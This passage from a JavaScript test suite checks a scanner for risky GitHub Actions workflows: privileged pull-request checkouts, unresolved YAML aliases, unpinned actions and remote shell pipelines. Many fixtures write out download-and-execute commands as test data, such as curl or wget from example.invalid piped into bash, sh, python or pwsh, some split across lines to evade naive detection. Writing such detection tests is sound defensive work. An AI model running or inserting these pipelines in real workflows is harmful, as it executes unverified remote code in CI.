 assert.ok(!rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
 assert.equal(r.coverage.partial,false);
});
test('ADVERSARIAL: real YAML checkout ref alias is unresolved even with a separate shell heredoc',()=>{
 const y=['on: pull_request_target','jobs:','  guard:','    steps:',
 '      - run: |','          ref: *shell_only',
 '      - uses: actions/checkout@'+SHA,
 '        with:','          ref: *genuine_alias'].join('\n');
 const r=scan(y);
 assert.equal(r.status,'INCOMPLETE');
 assert.equal(r.coverage.partial,true);
});
test('ADVERSARIAL: multiline run folded shell YAML-looking keys must remain inert',()=>{
 const y=['on: push','jobs:','  guard:','    steps:',
  '      - run: >-',
  '          ref: *literal',
  '          "\\u006fn": "${{ github.head_ref }}"',
  '          echo done'].join('\n');
 const r=scan(y);
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
});

test('DEEP P1: sequence name literal does not swallow real with ref alias',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - name: |','          checkout message',
  '        uses: actions/checkout@'+SHA,
  '        with:','          ref: *danger'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
 assert.equal(r.coverage.partial,true);
});
test('DEEP P1: sequence name folded block cannot hide a privileged checkout with untrusted ref',()=>{
 for(const indicator of ['|','>-','|2','>+']){
  const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
   '      - name: '+indicator,
   '          informational name',
   '        uses: actions/checkout@v6',
   '        with:','          ref: ${{ github.head_ref }}'].join('\n');
  const r=scan(yaml);
  assert.ok(rules(r).includes('UNPINNED_ACTION'),indicator+': '+JSON.stringify(r));
  assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),indicator+': '+JSON.stringify(r));
 }
});
test('DEEP P1: block scalar inside step followed by real with flow alias stays incomplete',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - name: |','          legitimate display name',
  '        uses: actions/checkout@'+SHA,
  '        with: {ref: *unverified_ref}'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
});
test('DEEP negative: literal name text containing pseudo-keys is not a real YAML action',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - name: |','          fake uses: actions/checkout@v6',
  '          with: *inert',
  '        run: echo safe'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
 assert.equal(r.coverage.partial,false);
});
test('DEEP negative: sequence run literal with shell lookalike is inert but next step is scanned',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - run: |',
  '          echo "ref: *shell_only"',
  '          echo "uses: actions/checkout@v6"',
  '      - uses: actions/checkout@'+SHA,
  '        with:','          ref: main'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
 assert.equal(r.coverage.partial,false);
});
test('DEEP negative: folded step name with legitimate pinned checkout has no false alert',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - name: >-',
  '          a benign block with ref: *shell',
  '        uses: actions/checkout@'+SHA,
  '        with:','          ref: main'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
});

test('DEEP P1: unresolved sequence item alias cannot certify job steps clean',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - *external_step'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
 assert.equal(r.coverage.partial,true);
});
test('DEEP P1: anchored unresolved step alias cannot certify job steps clean',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - &shared.step *external_step'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
 assert.equal(r.coverage.partial,true);
});
test('DEEP P1: YAML step merge key alias requires review, not silent success',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - <<: *checkout_definition'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
 assert.equal(r.coverage.partial,true);
});
test('DEEP negative: quoted alias-looking step name is ordinary text',()=>{
 const yaml=['on: push','jobs:','  audit:','    steps:',
  '      - name: "*not_real_alias"',
  '        uses: actions/checkout@'+SHA,
  '        with:','          ref: main'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
 assert.equal(r.coverage.partial,false);
});

test('P1: anchored pinned checkout action with unsafe ref produces BLOCKER, not false unpinned',()=>{
 const workflow=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - uses: &checkout actions/checkout@'+SHA,
  '        with:','          ref: ${{ github.head_ref }}'].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(result));
 assert.ok(!rules(result).includes('UNPINNED_ACTION'),JSON.stringify(result));
});
test('P1: dotted anchor on quoted checkout action is normalized before trust check',()=>{
 const workflow=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - uses: &trusted.checkout "actions/checkout@'+SHA+'"',
  '        with:','          ref: ${{ github.event.pull_request.head.sha }}'].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(result));
 assert.ok(!rules(result).includes('UNPINNED_ACTION'),JSON.stringify(result));
});
test('P1: anchored pinned action in YAML flow map detects privileged ref',()=>{
 const workflow=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - {uses: &checkout actions/checkout@'+SHA+', with: {ref: "${{ github.head_ref }}"}}'].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(result));
 assert.ok(!rules(result).includes('UNPINNED_ACTION'),JSON.stringify(result));
});
test('P1: anchored pinned checkout with trusted main ref stays safe',()=>{
 const workflow=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - uses: &checkout actions/checkout@'+SHA,'        with:','          ref: main'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN',JSON.stringify(result));
 assert.equal(result.coverage.partial,false);
});
test('P1: block step merge alias after ordinary name must fail closed',()=>{
 const workflow=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - name: merged','        <<: *step',
  '        run: echo benign'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'INCOMPLETE',JSON.stringify(result));
 assert.equal(result.coverage.partial,true);
});
test('P1: YAML flow step merge alias after name must fail closed',()=>{
 const workflow=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - {name: merged, <<: *step}'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'INCOMPLETE',JSON.stringify(result));
 assert.equal(result.coverage.partial,true);
});
test('P1: YAML flow step merge alias before other fields must fail closed',()=>{
 const workflow=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - {name: safe, <<: *step, run: echo safe}'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'INCOMPLETE',JSON.stringify(result));
});
test('P1: bare hyphen child merge alias must fail closed',()=>{
 const workflow=['on: pull_request_target','jobs:','  audit:','    steps:','      -',
  '          name: shared','          <<: *step'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'INCOMPLETE',JSON.stringify(result));
});
test('negative: merge-like strings in step names and scripts are inert',()=>{
 const workflow=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - name: "<<: *not_a_merge"',
  '        run: |',
  '          echo "<<: *not_a_merge"'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN',JSON.stringify(result));
 assert.equal(result.coverage.partial,false);
});

test('Codex P1: uniformly indented root on and jobs still detects privileged checkout',()=>{
 const yaml=['  on: pull_request_target','  jobs:','    audit:','      steps:',
 '        - uses: actions/checkout@'+SHA,'          with:',
 '            ref: ${{ github.head_ref }}'].join('\n');
 const result=scan(yaml);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(result));
});
test('Codex P1: uniformly indented root push is not a privileged event',()=>{
 const yaml=['   on: push','   jobs:','     audit:','       steps:',
 '         - uses: actions/checkout@'+SHA,'           with:',
 '             ref: ${{ github.head_ref }}'].join('\n');
 assert.ok(!rules(scan(yaml)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: root on below other root keys with uniform indentation is recognized',()=>{
 const yaml=['  name: audit','  on:','    pull_request_target:',
 '  jobs:','    audit:','      steps:',
 '        - uses: actions/checkout@'+SHA,'          with:',
 '            ref: ${{ github.head_ref }}'].join('\n');
 assert.ok(rules(scan(yaml)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: folded checkout uses scalar resolves action and detects unsafe ref',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
 '      - uses: >-','          actions/checkout@'+SHA,
 '        with:','          ref: ${{ github.head_ref }}'].join('\n');
 const result=scan(yaml);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(result));
 assert.ok(!rules(result).includes('UNPINNED_ACTION'),JSON.stringify(result));
});
test('Codex P1: later literal uses scalar and block with ref are analyzed',()=>{
 const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
 '      - name: checkout','        uses: |',
 '          actions/checkout@'+SHA,
 '        with:','          ref: ${{ github.head_ref }}'].join('\n');
 const result=scan(yaml);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(result));
});
test('block scalar for SHA-pinned ordinary action is not falsely flagged unpinned',()=>{
 const yaml=['on: push','jobs:','  audit:','    steps:',
 '      - uses: >','          actions/checkout@'+SHA,
 '        with:','          ref: main'].join('\n');
 const result=scan(yaml);
 assert.equal(result.status,'NO_RISK_PATTERN',JSON.stringify(result));
});
test('Codex P2: shell snippet in name or env string is inert',()=>{
 const yaml=['on: push','jobs:','  audit:','    steps:',
 '      - name: "Avoid curl https://example.invalid | bash"',
 '        env:','          HINT: "curl https://example.invalid | bash"',
 '        run: echo safe'].join('\n');
 const r=scan(yaml);
 assert.ok(!rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
});
test('Codex P2: a real inline shell pipe in a step run is detected',()=>{
 const yaml=['on: push','jobs:','  audit:','    steps:',
 '      - run: curl -fsSL https://example.invalid/install.sh | bash'].join('\n');
 assert.ok(rules(scan(yaml)).includes('REMOTE_SHELL_PIPELINE'));
});
test('Codex P2: multiline run script detects remote shell pipe',()=>{
 const yaml=['on: push','jobs:','  audit:','    steps:',
 '      - name: installer','        run: |',
 '          echo preparing',
 '          curl -fsSL https://example.invalid/install.sh | bash'].join('\n');
 assert.ok(rules(scan(yaml)).includes('REMOTE_SHELL_PIPELINE'));
});
test('Codex P2: flow step run detects shell pipe but flow name does not',()=>{
 const dangerous=['on: push','jobs:','  audit:','    steps:',
 '      - {name: safe, run: "curl https://example.invalid | sh"}'].join('\n');
 const benign=['on: push','jobs:','  audit:','    steps:',
 '      - {name: "curl https://example.invalid | bash", run: "echo safe"}'].join('\n');
 assert.ok(rules(scan(dangerous)).includes('REMOTE_SHELL_PIPELINE'));
 assert.ok(!rules(scan(benign)).includes('REMOTE_SHELL_PIPELINE'));
});
test('an unrelated workflow description is never an executable shell pipeline',()=>{
 const yaml=['name: "Avoid curl https://example.invalid | bash"',
 'on: push','jobs:','  audit:','    steps:',
 '      - uses: actions/checkout@'+SHA].join('\n');
 assert.equal(scan(yaml).status,'NO_RISK_PATTERN');
});

test('proactive: folded run pipeline split across YAML physical lines is detected',()=>{
 const yaml=['on: push','jobs:','  audit:','    steps:',
 '      - run: >-',
 '          curl -fsSL https://example.invalid/install.sh',
 '          | bash'].join('\n');
 assert.ok(rules(scan(yaml)).includes('REMOTE_SHELL_PIPELINE'));
});
test('proactive: folded harmless script does not falsely count a remote shell pipe',()=>{
 const yaml=['on: push','jobs:','  audit:','    steps:',
 '      - run: >-',
 '          echo prepare',
 '          echo safe'].join('\n');
 assert.equal(scan(yaml).status,'NO_RISK_PATTERN');
});
test('proactive: overlong folded on trigger cannot be declared clean',()=>{
 const yaml=['on: >-',...Array.from({length:75},(_,i)=>'  harmless_event_'+i),
 '  pull_request_target','jobs:','  audit:','    steps:',
 '      - uses: actions/checkout@'+SHA,
 '        with:','          ref: ${{ github.head_ref }}'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
 assert.equal(r.coverage.partial,true);
});
test('proactive: block sequence of on events exposes privileged checkout',()=>{
 const yaml=['on:','  - push','  - pull_request_target',
 'jobs:','  audit:','    steps:',
 '      - uses: actions/checkout@'+SHA,
 '        with:','          ref: ${{ github.head_ref }}'].join('\n');
 const r=scan(yaml);
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('proactive: indented workflow root with writable permissions is not missed',()=>{
 const yaml=['  on: pull_request','  permissions:',
 '    contents: write','  jobs:','    audit:','      steps:',
 '        - uses: actions/checkout@'+SHA].join('\n');
 assert.ok(rules(scan(yaml)).includes('PRIVILEGED_WRITE_TOKEN'));
});

test('Codex P1: YAML on folded scalar with indent indicator >2- detects privileged checkout',()=>{
 const yaml=['on: >2-', '  pull_request_target', 'jobs:', '  audit:', '    steps:',
  '      - uses: actions/checkout@'+SHA, '        with:', '          ref: ${{ github.head_ref }}'].join('\n');
 const r=scan(yaml);
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
 assert.equal(r.coverage.partial,false);
});
test('Codex P1: uniformly indented root on alias cannot silently pass as clean',()=>{
 const yaml=['  on: *events', '  jobs:', '    audit:', '      steps:',
  '        - uses: actions/checkout@'+SHA,
  '          with:', '            ref: ${{ github.head_ref }}'].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
 assert.equal(r.coverage.partial,true);
});
test('Codex P1: uniformly indented root quoted alias remains ambiguous and incomplete',()=>{
 const yaml=['   on: "*events"', '   jobs:', '     audit:', '       steps:',
  '         - uses: actions/checkout@'+SHA].join('\n');
 const r=scan(yaml);
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
});
test('Codex P1: checkout of refs/pull dynamic number merge under privileged event is blocked',()=>{
 const yaml=['on: pull_request_target', 'jobs:', '  audit:', '    steps:',
  '      - uses: actions/checkout@'+SHA, '        with:',
  '          ref: refs/pull/${{ github.event.pull_request.number }}/merge'].join('\n');
 const r=scan(yaml);
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('Codex P1: checkout of refs/pull dynamic number head under privileged event is blocked',()=>{
 const yaml=['on: pull_request_target', 'jobs:', '  audit:', '    steps:',
  '      - uses: actions/checkout@'+SHA, '        with:',
  '          ref: "refs/pull/${{ github.event.pull_request.number }}/head"'].join('\n');
 const r=scan(yaml);
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('Codex P1: PR-number templating in unrelated branch ref is not a PR merge ref',()=>{
 const yaml=['on: pull_request_target', 'jobs:', '  audit:', '    steps:',
  '      - uses: actions/checkout@'+SHA, '        with:',
  '          ref: "refs/heads/release-${{ github.event.pull_request.number }}"'].join('\n');
 const r=scan(yaml);
 assert.ok(!rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('Codex P2: backslash-continued bash pipeline inside literal run block is detected',()=>{
 const yaml=['on: push', 'jobs:', '  audit:', '    steps:', '      - run: |',
  '          curl -fsSL https://example.invalid/payload \\',
  '          | bash'].join('\n');
 const r=scan(yaml);
 assert.ok(rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
});
test('Codex P2: wget pipe to sh split with shell continuation is detected',()=>{
 const yaml=['on: push', 'jobs:', '  audit:', '    steps:',
  '      - name: install', '        run: |',
  '          wget -qO- https://example.invalid/payload \\',
  '          | sh'].join('\n');
 const r=scan(yaml);
 assert.ok(rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
});
test('Codex P2: literal run lines lacking a backslash are separate shell commands',()=>{
 const yaml=['on: push', 'jobs:', '  audit:', '    steps:',
  '      - run: |', '          echo curl -fsSL https://example.invalid/payload',
  '          echo "| bash"'].join('\n');
 const r=scan(yaml);
 assert.ok(!rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
});
test('Codex P2: fake continued pipeline inside name block is non-executable',()=>{
 const yaml=['on: push', 'jobs:', '  audit:', '    steps:',
  '      - name: |',
  '          curl -fsSL https://example.invalid/payload \\',
  '          | bash',
  '        run: echo safe'].join('\n');
 const r=scan(yaml);
 assert.ok(!rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
});

test('RED P1: format refs/pull merge PR number cannot evade privileged checkout',()=>{
 const y=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - uses: actions/checkout@'+SHA,
  '        with:','          ref: ${{ format("refs/pull/{0}/merge", github.event.pull_request.number) }}'].join('\n');
 assert.ok(rules(scan(y)).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(scan(y)));
});
test('RED P1: block-indented ref >2- reconstructs dynamic PR merge checkout',()=>{
 const y=['on: pull_request_target','jobs:','  audit:','    steps:',
 '      - uses: actions/checkout@'+SHA,
 '        with:','          ref: >2-',
 '            refs/pull/${{ github.event.pull_request.number }}/merge'].join('\n');
 assert.ok(rules(scan(y)).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(scan(y)));
});
test('RED P2: literal shell continuation must join ba backslash sh without a space',()=>{
 const y=['on: push','jobs:','  audit:','    steps:',
 '      - run: |',
 '          curl https://example.invalid/payload | ba\\',
 '          sh'].join('\n');
 assert.ok(rules(scan(y)).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(scan(y)));
});
test('RED P2: Bash |& bash is a remote shell pipeline',()=>{
 const y=['on: push','jobs:','  audit:','    steps:',
  '      - run: curl https://example.invalid/payload |& bash'].join('\n');
 assert.ok(rules(scan(y)).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(scan(y)));
});
test('negative: normal branch ref using pull request number is not synthetic PR checkout',()=>{
 const y=['on: pull_request_target','jobs:','  audit:','    steps:',
  '      - uses: actions/checkout@'+SHA,'        with:',
  '          ref: "refs/heads/release-${{ github.event.pull_request.number }}"'].join('\n');
 assert.ok(!rules(scan(y)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('negative: pipeline text in name and environment is inert',()=>{
 const y=['on: push','jobs:','  audit:','    steps:',
  '      - name: "curl URL |& bash"',
  '        env:', '          DESCR: "wget URL |& sh"',
  '        run: echo normal'].join('\n');
 assert.ok(!rules(scan(y)).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(scan(y)));
});

test('Codex P1: heuristic supply chain review flags Python and PowerShell download pipelines',()=>{
 for(const interpreter of ['python','python3','pwsh','powershell','node','ruby','perl','php']){
  const yaml=['on: push','jobs:','  audit:','    steps:',
   '      - run: curl -fsSL https://example.invalid/payload | '+interpreter].join('\n');
  const result=scan(yaml);
  assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify({interpreter,result}));
 }
});

test('ROOT-8: supply-chain heuristic detects Bash newline after pipe',()=>{
 const examples=[
  ['curl https://example.invalid/payload |','  python'],
  ['curl https://example.invalid/payload |&','  pwsh'],
  ['wget -qO- https://example.invalid/payload |','  node']
 ];
 for(const code of examples){
  const y=['on: push','jobs:','  test:','    steps:','      - run: |',...code.map(s=>'          '+s)].join('\n');
  const result=scan(y);
  assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify({code,result}));
 }
});
test('ROOT-8: supply-chain heuristic detects download pipeline after 240 chars',()=>{
 for(const count of [241,512,2048]){
  const y=['on: push','jobs:','  test:','    steps:',
   '      - run: curl https://example.invalid/'+('z'.repeat(count))+' | python'].join('\n');
  const result=scan(y);
  assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify({count,result}));
 }
});
